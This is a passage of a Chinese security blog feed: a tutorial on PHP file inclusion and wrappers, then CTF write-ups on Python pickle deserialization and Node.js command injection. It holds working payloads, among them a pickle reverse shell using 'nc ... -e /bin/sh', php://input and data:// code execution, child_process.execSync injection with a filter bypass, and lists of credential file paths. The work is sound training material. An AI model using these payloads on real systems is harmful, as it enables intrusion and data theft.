        <content type="html"><![CDATA[<span id="more"></span><h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><h2 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h2><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</p><p>以PHP为例,常用的文件包含函数有以下四种<br><code>include(),require(),include_once(),require_once()</code></p><p>区别如下:</p><ul><li><code>require()</code>：找不到被包含的文件会产生致命错误，并停止脚本运行</li><li><code>include()</code>：找不到被包含的文件只会产生警告，脚本继续执行</li><li><code>require_once()</code>与<code>require()</code>类似：唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li><li><code>include_once()</code>与<code>include()</code>类似：唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li></ul><h2 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h2><p>我们先直接来看一个简单的例子，网页代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在创建一个phpinfo.php页面，代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file.png" alt=""></p><p>将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:</p><h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="本地文件包含漏洞-LFI"><a href="#本地文件包含漏洞-LFI" class="headerlink" title="本地文件包含漏洞(LFI)"></a>本地文件包含漏洞(LFI)</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>测试网页包含如下代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网站利用文件包含功能读取一些php文件，例如phpinfo:</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_01.png" alt=""></p><p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>例如:<code>C:\Windows\system.ini</code>文件</p><p>（1）使用绝对路径</p><p>使用绝对路径直接读取:</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_02.png" alt=""></p><p>（2）使用相对路径进行读取</p><p>通过<code>./</code>表示当前位置路径，<code>../</code>表示上一级路径位置，在linux中同样适用</p><p>例如当前页面所在路径为<code>C:\Apache24\htdocs\</code>，我们需要使用<code>../</code>退到C盘再进行访问，构造路径如下：<br><code>../../windows/system.ini</code></p><p>（3）一些常见的敏感目录信息路径:</p><p>Windows系统:</p><ul><li><code>C:\boot.ini</code>     //查看系统版本</li><li><code>C:\windows\system32\inetsrv\MetaBase.xml</code>     //IIS配置文件</li><li><code>C:\windows\repair\sam</code>     //存储Windows系统初次安装的密码</li><li><code>C:\ProgramFiles\mysql\my.ini</code>     //Mysql配置</li><li><code>C:\ProgramFiles\mysql\data\mysql\user.MYD</code>   //MySQL root密码</li><li><code>C:\windows\php.ini</code>     //php配置信息</li></ul><p>Linux/Unix系统:</p><ul><li><code>/etc/password</code>     //账户信息</li><li><code>/etc/shadow</code>     //账户密码信息</li><li><code>/usr/local/app/apache2/conf/httpd.conf</code>     //Apache2默认配置文件</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhost.conf</code>     //虚拟网站配置</li><li><code>/usr/local/app/php5/lib/php.ini</code>     //PHP相关配置</li><li><code>/etc/httpd/conf/httpd.conf</code>     //Apache配置文件</li><li><code>/etc/my.conf</code>     //mysql配置文件</li></ul><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p><p>首先我们来看一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$path</span> . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问本地site目录下的phpinfo.php文件:</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_03.png" alt=""></p><p>该页面并没有对$path做任何过滤，因此存在文件包含漏洞。</p><p>我们在远端Web服务器/site/目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件，成功读取test.php如下：</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_04.png" alt=""></p><p>如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限</p><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>PHP内置了很多URL风格的封装协议，可用于类似<code>fopen()、copy()、file_exists()和filesize()</code>的文件系统函数</p><p>如下所示</p><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>file://</td><td>访问本地文件系统</td></tr><tr><td>http://</td><td>访问HTTP(s)网址</td></tr><tr><td>ftp://</td><td>访问FTP(s)URLs</td></tr><tr><td>php://</td><td>访问各个输入/输出流（I/O streams）</td></tr><tr><td>zlib://</td><td>压缩流</td></tr><tr><td>data://</td><td>数据（RFC 2397）</td></tr><tr><td>glob://</td><td>查找匹配的文件路径格式</td></tr></tbody></table></div><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><p><code>file://</code> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</p><p>使用方法：<code>file:// [文件的绝对路径和文件名]</code></p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_05.png" alt=""></p><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h2><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code><br><code>php://filter</code> 用于读取源码<br><code>php://input</code> 用于执行php代码</p><p><code>php://filter</code>  读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了</p><p><strong>利用条件:</strong></p><ul><li><code>allow_url_fopen</code> ：off/on</li><li><code>allow_url_include</code>：off/on</li></ul><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>获取指定文件源码。当他与包含函数结合时，php://filter流会被当作php文件执行</p><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td><td>`）分隔。</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td><td>`）分隔。</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></div><p>常用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php</span></span><br><span class="line"></span><br><span class="line">convert.base64-encode过滤器</span><br></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为<code>php://input</code>，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行</p><p><strong>注意：</strong><br>当<code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code>是无效的<br>遇到<code>file_get_contents()</code>要想到用<code>php://input</code>绕过</p><h2 id="ZIP-协议"><a href="#ZIP-协议" class="headerlink" title="ZIP://协议"></a>ZIP://协议</h2><p><code>zip://</code> 可以访问压缩包里面的文件。当它与包含函数结合时，<code>zip://</code>流会被当作php文件执行。从而实现任意代码执行</p><ul><li><code>zip://</code>中只能传入绝对路径。</li><li>要用<code>#</code>分割压缩包和压缩包里的内容，并且<code>#</code>要用url编码成<code>%23(</code>即下述POC中<code>#</code>要用<code>%23</code>替换）</li><li>只需要是zip的压缩包即可，后缀名可以任意更改。</li><li>相同的类型还有<code>zlib://</code>和<code>bzip2://</code></li></ul><p><strong>利用条件:</strong></p><ul><li><code>allow_url_fopen</code> ：off/on</li><li><code>allow_url_include</code>：off/on</li></ul><p>POC为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">//[压缩包绝对路径]#[压缩包内文件]</span></span><br></pre></td></tr></table></figure><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p><code>data://</code> 同样类似与<code>php://input</code>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行。从而导致任意代码执行</p><p>利用<code>data://</code> 伪协议可以直接达到执行php代码的效果，例如执行<code>phpinfo()</code>函数</p><p><strong>利用条件:</strong></p><ul><li><code>allow_url_fopen</code> ：on</li><li><code>allow_url_include</code>：on</li></ul><p>POC为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="comment">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="title function_ invoke__">file_get_contents</span> ( <span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python反序列化-wp</title>
      <link href="/2023/08/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/"/>
      <url>/2023/08/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p>打开后发现是一个简单的购物界面，查看源码也没有可用信息，尝试扫目录：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python.png" alt=""></p><p>没什么有用的信息，尝试抓包：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_01.png" alt=""></p><p>感觉cookie值像某种编码，尝试解码：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_02.png" alt=""></p><p>没有解码成功，结合题目，可知是关于pickle的python反序列化，尝试将解码后的数据反序列化一下：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_03.png" alt=""></p><p>发现该处存在pytohn反序列化，尝试利用一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>发现没有回显，尝试反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc vpsip port -e/bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>vps上监听6666端口：<code>nc -lvp port</code></p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_04.png" alt=""></p><p>利用bp将编码后的paylaod发送</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_05.png" alt="">反弹shell成功，得到flag：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_06.png" alt=""></p><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>打开后发现如下界面：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun.png" alt=""></p><p>注册账号登陆一下，在主页面发现hint，让我们一定要到lv6，那我们就去买：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_01.png" alt=""></p><p>浏览了几页，发现没找到，尝试python脚本寻找：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c1526858-2f99-427f-8512-f7ed026fe515.node4.buuoj.cn:81/shop?page=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">p_url = url+<span class="built_in">str</span>(i)</span><br><span class="line">params = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=p_url,params=params)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(p_url)</span><br></pre></td></tr></table></figure><p>发现结果：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_02.png" alt=""></p><p>访问此页面，购买此物品，发现钱不够<code>O.o</code>，bp抓包修改金额：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_03.png" alt=""></p><p>发现不行，只能修改折扣了，将折扣改的很小很小</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_04.png" alt=""></p><p>发现hint：<code>/b1g_m4mber</code>，访问，发现此页面只让admin访问：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_14.png" alt=""></p><p>看bp抓的包，发现jwt存在，尝试解码：</p><ul><li><a href="https://jwt.io/">jwt在线网站</a></li></ul><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_05.png" alt=""></p><p>可以通过伪造jwt，来实现admin登录，通过jwt工具，爆破密钥：</p><ul><li><a href="https://github.com/brendan-rius/c-jwt-cracker">jwt爆破密钥工具</a></li></ul><p>爆破成功</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_06.png" alt=""></p><p>伪造jwt：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_07.png" alt=""></p><p>伪造成功：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_08.png" alt=""></p><p>放包后查看源代码，发现hint：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_09.png" alt=""></p><p>下载源码之后，查看，发现在<code>Admin.py</code>文件发现可以数据：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_10.png" alt=""></p><p>该变量存在python反序列化漏洞，构造payload，抓包修改<code>become</code>的值：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_11.png" alt=""></p><p>发现不行，查看源码发现<code>become</code>被<code>hidden</code></p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_12.png" alt=""></p><p>将此标签属性删除，重新抓包：</p><p>构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>将payload传进去，得到flag</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_13.png" alt=""></p><h1 id="SUCTF-2019-guess-game"><a href="#SUCTF-2019-guess-game" class="headerlink" title="SUCTF-2019:guess_game"></a>SUCTF-2019:guess_game</h1><p>还没找到题目在哪。。。。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-Nodejs</title>
      <link href="/2023/08/03/CTFSHOW-Nodejs/"/>
      <url>/2023/08/03/CTFSHOW-Nodejs/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web334-大小写特性"><a href="#web334-大小写特性" class="headerlink" title="web334(大小写特性)"></a>web334(大小写特性)</h1><p>发现有个附件，下载发现时两个js文件：</p><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>user.js</strong></p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打开环境后发现是个登陆界面，尝试<code>CTFSHOW/123456</code>登录，发现登陆失败，仔细查看代码，发现对我们的输入的用户名进行大写转换，在判断是否符合条件，所以我们用户名用小写</p><p><img src="/img/CTFSHOW-Nodejs/334.png" alt=""></p><h1 id="web335-命令执行"><a href="#web335-命令执行" class="headerlink" title="web335(命令执行)"></a>web335(命令执行)</h1><p>打开后什么也没有，直接看源码，发现提示：</p><p><img src="/img/CTFSHOW-Nodejs/335.png" alt=""></p><p>猜测可以命令执行</p><p>测试：<code>?eval=require(&quot;child_process&quot;).execSync(&#39;whoami&#39;)</code></p><p><img src="/img/CTFSHOW-Nodejs/335_01.png" alt=""></p><p>成功！读取flag</p><p><code>payload: ?eval=require(&quot;child_process&quot;).execSync(&#39;cat fl00g.txt&#39;)</code></p><h1 id="web336-过滤"><a href="#web336-过滤" class="headerlink" title="web336(过滤)"></a>web336(过滤)</h1><p>与上题类似，页面无有用信息，查看源码，得到提示，尝试用上道题的paylaod</p><p>返回页面：</p><p><img src="/img/CTFSHOW-Nodejs/336.png" alt=""></p><p>猜测可能有过滤，尝试利用字符串拼接的方法：</p><p><img src="/img/CTFSHOW-Nodejs/336_01.png" alt=""></p><p>成功！读取flag</p><p><code>payload: ?eval=require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat fl001g.txt&#39;)</code></p><h1 id="web337-md5绕过"><a href="#web337-md5绕过" class="headerlink" title="web337(md5绕过)"></a>web337(md5绕过)</h1><p>题目上有代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) 